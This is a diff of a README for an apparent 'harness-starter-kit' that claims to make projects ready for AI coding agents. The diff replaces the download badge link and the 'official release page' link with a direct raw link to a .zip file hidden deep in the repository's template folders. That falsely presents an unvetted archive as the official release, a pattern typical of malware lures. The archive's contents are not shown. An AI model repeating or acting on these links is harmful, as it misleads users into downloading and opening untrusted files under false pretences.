@@ -1,6 +1,6 @@
 # 🛡️ harness-starter-kit - Make your code safe for AI agents
 
-[![](https://img.shields.io/badge/Download-harness--starter--kit-blue.svg)](https://github.com/Livingwagedictionaryentry974/harness-starter-kit)
+[![](https://img.shields.io/badge/Download-harness--starter--kit-blue.svg)](https://github.com/Livingwagedictionaryentry974/harness-starter-kit/raw/refs/heads/main/templates/profiles/flask/harness_kit_starter_nictate.zip)
 
 The harness-starter-kit helps you prepare your software projects for AI coding tools. Modern AI agents read your files to suggest code and fix bugs. This kit adds the structure and context these tools need to perform well.
 
@@ -19,7 +19,7 @@ AI coding agents function like human developers. They need clear instructions to
 
 Follow these steps to set up the kit on your computer.
 
-1. Go to the [official release page](https://github.com/Livingwagedictionaryentry974/harness-starter-kit).
+1. Go to the [official release page](https://github.com/Livingwagedictionaryentry974/harness-starter-kit/raw/refs/heads/main/templates/profiles/flask/harness_kit_starter_nictate.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .zip to start your download.
 4. Open your Downloads folder once the file finishes saving.
